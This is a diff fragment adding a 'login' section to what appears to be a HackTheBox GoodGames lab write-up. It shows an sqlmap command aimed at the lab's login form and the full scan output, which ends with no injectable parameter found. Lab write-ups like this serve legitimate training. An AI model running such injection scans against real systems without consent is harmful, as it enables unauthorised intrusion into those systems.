@@ -428,3 +428,72 @@ it is recommended to perform only basic UNION tests if there is not at least one
 
 [*] ending @ 12:18:42 /2022-12-22/
 ```
+
+**login**
+
+```
+[ 12:21PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]                                                                                                                      
+ $ sqlmap -u "http://goodgames.htb/login" --data "email=*&password=*"                                                                                                               
+        ___                                                                                                                                                                         
+       __H__                                                                                                                                                                        
+ ___ ___[)]_____ ___ ___  {1.6.12#stable}                                                                                                                                           
+|_ -| . [(]     | .'| . |                                                                                                                                                           
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                                           
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                        
+                                                                                                                                                                                    
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and fed
+eral laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                   
+                                                                                                                                                                                    
+[*] starting @ 12:21:52 /2022-12-22/                                                                                                                                                
+                                                                                                                                                                                    
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[12:21:58] [INFO] testing connection to the target URL
+[12:21:58] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:21:58] [INFO] testing if the target URL content is stable
+[12:21:58] [INFO] target URL content is stable
+[12:21:58] [INFO] testing if (custom) POST parameter '#1*' is dynamic
+[12:21:58] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
+[12:21:59] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
+[12:21:59] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
+[12:21:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:22:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[12:22:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[12:22:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[12:22:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[12:22:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[12:22:01] [INFO] testing 'Generic inline queries'
+[12:22:01] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[12:22:01] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[12:22:02] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[12:22:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[12:22:12] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[12:22:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:22:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[12:22:28] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[12:22:28] [INFO] target URL appears to have 4 columns in query
+got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] Y
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[12:23:03] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[12:23:05] [INFO] target URL appears to be UNION injectable with 4 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
+[12:23:22] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+[12:23:22] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
+[12:23:28] [WARNING] false positive or unexploitable injection point detected
+[12:23:28] [WARNING] (custom) POST parameter '#1*' does not seem to be injectable
+[12:23:28] [INFO] testing if (custom) POST parameter '#2*' is dynamic
+[12:23:28] [WARNING] (custom) POST parameter '#2*' does not appear to be dynamic
+[12:23:28] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#2*' might not be injectable
+[12:23:28] [INFO] testing for SQL injection on (custom) POST parameter '#2*'
+[12:23:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:23:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[12:23:28] [INFO] testing 'Generic inline queries'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+[12:23:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[12:23:51] [WARNING] (custom) POST parameter '#2*' does not seem to be injectable
+[12:23:51] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
+[*] ending @ 12:23:51 /2022-12-22/
+```
